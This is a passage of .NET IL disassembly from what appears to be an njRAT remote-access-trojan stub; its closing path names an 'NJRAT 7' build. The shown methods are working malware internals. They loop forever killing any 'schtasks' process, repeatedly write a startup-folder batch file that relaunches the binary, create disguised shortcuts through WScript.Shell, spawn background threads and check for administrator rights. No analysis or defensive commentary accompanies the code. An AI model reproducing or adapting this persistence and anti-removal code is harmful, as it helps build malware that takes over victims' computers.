        IL_0049:  call       object F.P::Thr(int32)
        IL_004e:  pop
        IL_004f:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
        IL_0054:  stloc.s    VB$t_array$L0
        IL_0056:  ldc.i4.0
        IL_0057:  stloc.s    VB$t_i4$L0
        IL_0059:  br.s       IL_0081

        IL_005b:  ldloc.s    VB$t_array$L0
        IL_005d:  ldloc.s    VB$t_i4$L0
        IL_005f:  ldelem.ref
        IL_0060:  stloc.2
        IL_0061:  ldloc.2
        IL_0062:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_0067:  ldstr      "schtasks"
        IL_006c:  ldc.i4.0
        IL_006d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_0072:  ldc.i4.0
        IL_0073:  bne.un.s   IL_007b

        IL_0075:  ldloc.2
        IL_0076:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_007b:  ldloc.s    VB$t_i4$L0
        IL_007d:  ldc.i4.1
        IL_007e:  add.ovf
        IL_007f:  stloc.s    VB$t_i4$L0
        IL_0081:  ldloc.s    VB$t_i4$L0
        IL_0083:  ldloc.s    VB$t_array$L0
        IL_0085:  ldlen
        IL_0086:  conv.ovf.i4
        IL_0087:  blt.s      IL_005b

        IL_0089:  leave.s    IL_0099

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_008b:  dup
        IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0091:  stloc.3
        IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0097:  leave.s    IL_0099

      }  // end handler
      IL_0099:  leave.s    IL_00aa

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009b:  dup
      IL_009c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a1:  stloc.s    V_4
      IL_00a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a8:  leave.s    IL_00aa

    }  // end handler
    IL_00aa:  br         IL_0002
  } // end of method Km::F

  .method public static void  Pu() cil managed
  {
    // Code size       124 (0x7c)
    .maxstack  4
    .locals init ([0] int32 t,
             [1] class [mscorlib]System.Text.StringBuilder sb,
             [2] class [mscorlib]System.Exception V_2)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  ldc.i4     0x3e8
    IL_0007:  call       object F.P::Thr(int32)
    IL_000c:  pop
    .try
    {
      IL_000d:  ldloc.0
      IL_000e:  ldc.i4.1
      IL_000f:  add.ovf
      IL_0010:  stloc.0
      IL_0011:  ldloc.0
      IL_0012:  ldc.i4.s   16
      IL_0014:  ble.s      IL_006a

      IL_0016:  ldc.i4.0
      IL_0017:  stloc.0
      IL_0018:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_001d:  stloc.1
      IL_001e:  ldloc.1
      IL_001f:  ldstr      "@echo off"
      IL_0024:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendLine(string)
      IL_0029:  pop
      IL_002a:  ldloc.1
      IL_002b:  ldstr      "start "
      IL_0030:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
      IL_0035:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_003a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_003f:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendLine(string)
      IL_0044:  pop
      IL_0045:  ldc.i4.7
      IL_0046:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_004b:  ldstr      "\\"
      IL_0050:  ldsfld     string F.P::RG
      IL_0055:  ldstr      ".bat"
      IL_005a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_005f:  ldloc.1
      IL_0060:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0065:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                       string)
      IL_006a:  leave.s    IL_007a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006c:  dup
      IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0072:  stloc.2
      IL_0073:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0078:  leave.s    IL_007a

    }  // end handler
    IL_007a:  br.s       IL_0002
  } // end of method Km::Pu

  .method public static object  M(string File,
                                  string ShortcutFolder,
                                  string Name,
                                  string WorkDirectory) cil managed
  {
    // Code size       218 (0xda)
    .maxstack  9
    .locals init ([0] object M,
             [1] object NewShortcut,
             [2] object WshShell,
             [3] object[] VB$t_array$S0)
    IL_0000:  ldstr      "WScript.Shell"
    IL_0005:  ldstr      ""
    IL_000a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                       string)
    IL_000f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0014:  stloc.2
    IL_0015:  ldloc.2
    IL_0016:  ldnull
    IL_0017:  ldstr      "CreateShortcut"
    IL_001c:  ldc.i4.1
    IL_001d:  newarr     [mscorlib]System.Object
    IL_0022:  stloc.3
    IL_0023:  ldloc.3
    IL_0024:  ldc.i4.0
    IL_0025:  ldarg.1
    IL_0026:  ldstr      "\\"
    IL_002b:  ldarg.2
    IL_002c:  ldstr      ".lnk"
    IL_0031:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0036:  stelem.ref
    IL_0037:  ldloc.3
    IL_0038:  ldnull
    IL_0039:  ldnull
    IL_003a:  ldnull
    IL_003b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_0040:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0045:  stloc.1
    IL_0046:  ldloc.1
    IL_0047:  ldnull
    IL_0048:  ldstr      "TargetPath"
    IL_004d:  ldc.i4.1
    IL_004e:  newarr     [mscorlib]System.Object
    IL_0053:  stloc.3
    IL_0054:  ldloc.3
    IL_0055:  ldc.i4.0
    IL_0056:  ldarg.0
    IL_0057:  stelem.ref
    IL_0058:  ldloc.3
    IL_0059:  ldnull
    IL_005a:  ldnull
    IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_0060:  ldloc.1
    IL_0061:  ldnull
    IL_0062:  ldstr      "WindowStyle"
    IL_0067:  ldc.i4.1
    IL_0068:  newarr     [mscorlib]System.Object
    IL_006d:  stloc.3
    IL_006e:  ldloc.3
    IL_006f:  ldc.i4.0
    IL_0070:  ldc.i4.1
    IL_0071:  box        [mscorlib]System.Int32
    IL_0076:  stelem.ref
    IL_0077:  ldloc.3
    IL_0078:  ldnull
    IL_0079:  ldnull
    IL_007a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_007f:  ldloc.1
    IL_0080:  ldnull
    IL_0081:  ldstr      "IconLocation"
    IL_0086:  ldc.i4.1
    IL_0087:  newarr     [mscorlib]System.Object
    IL_008c:  stloc.3
    IL_008d:  ldloc.3
    IL_008e:  ldc.i4.0
    IL_008f:  ldarg.0
    IL_0090:  ldstr      ",0"
    IL_0095:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_009a:  stelem.ref
    IL_009b:  ldloc.3
    IL_009c:  ldnull
    IL_009d:  ldnull
    IL_009e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_00a3:  ldloc.1
    IL_00a4:  ldnull
    IL_00a5:  ldstr      "WorkingDirectory"
    IL_00aa:  ldc.i4.1
    IL_00ab:  newarr     [mscorlib]System.Object
    IL_00b0:  stloc.3
    IL_00b1:  ldloc.3
    IL_00b2:  ldc.i4.0
    IL_00b3:  ldstr      ""
    IL_00b8:  stelem.ref
    IL_00b9:  ldloc.3
    IL_00ba:  ldnull
    IL_00bb:  ldnull
    IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_00c1:  ldloc.1
    IL_00c2:  ldnull
    IL_00c3:  ldstr      "Save"
    IL_00c8:  ldc.i4.0
    IL_00c9:  newarr     [mscorlib]System.Object
    IL_00ce:  ldnull
    IL_00cf:  ldnull
    IL_00d0:  ldnull
    IL_00d1:  ldc.i4.1
    IL_00d2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_00d7:  pop
    IL_00d8:  ldloc.0
    IL_00d9:  ret
  } // end of method Km::M

  .method public static void  I() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init ([0] class [mscorlib]System.Threading.Thread StartCopy)
    IL_0000:  ldnull
    IL_0001:  ldftn      void F.Km::S()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Km::I

  .method public static void  U() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init ([0] class [mscorlib]System.Threading.Thread StartCopy)
    IL_0000:  ldnull
    IL_0001:  ldftn      void F.Km::F()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Km::U

  .method public static void  C() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init ([0] class [mscorlib]System.Threading.Thread StartCopy)
    IL_0000:  ldnull
    IL_0001:  ldftn      void F.Km::Pu()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Km::C

  .method public static bool  Ia() cil managed
  {
    // Code size       25 (0x19)
    .maxstack  2
    .locals init ([0] bool Ia,
             [1] class [mscorlib]System.Security.Principal.WindowsIdentity Id,
             [2] class [mscorlib]System.Security.Principal.WindowsPrincipal Pr)
    IL_0000:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
    IL_0005:  stloc.1
    IL_0006:  ldloc.1
    IL_0007:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
    IL_000c:  stloc.2
    IL_000d:  ldloc.2
    IL_000e:  ldc.i4     0x220
    IL_0013:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
    IL_0018:  ret
  } // end of method Km::Ia

} // end of class F.Km

.class private auto ansi sealed VB$AnonymousDelegate_0
       extends [mscorlib]System.MulticastDelegate
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerDisplayAttribute::.ctor(string) = ( 01 00 12 3C 67 65 6E 65 72 61 74 65 64 20 6D 65   // ...<generated me
                                                                                                 74 68 6F 64 3E 01 00 54 0E 04 54 79 70 65 12 3C   // thod>..T..Type.<
                                                                                                 67 65 6E 65 72 61 74 65 64 20 6D 65 74 68 6F 64   // generated method
                                                                                                 3E )                                              // >
  .method public specialname rtspecialname 
          instance void  .ctor(object TargetObject,
                               native int TargetMethod) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::.ctor

  .method public newslot strict virtual instance class [mscorlib]System.IAsyncResult 
          BeginInvoke(class [mscorlib]System.AsyncCallback DelegateCallback,
                      object DelegateAsyncState) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::BeginInvoke

  .method public newslot strict virtual instance void 
          EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::EndInvoke

  .method public newslot strict virtual instance void 
          Invoke() runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::Invoke

} // end of class VB$AnonymousDelegate_0


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file E:\2017\NJRAT 7 Full\Hiden blade rat +++ networkstream\N\NJRAT 7 Original o\NJRAT\bin\Release\F\F\bin\x86\Release\stub.res
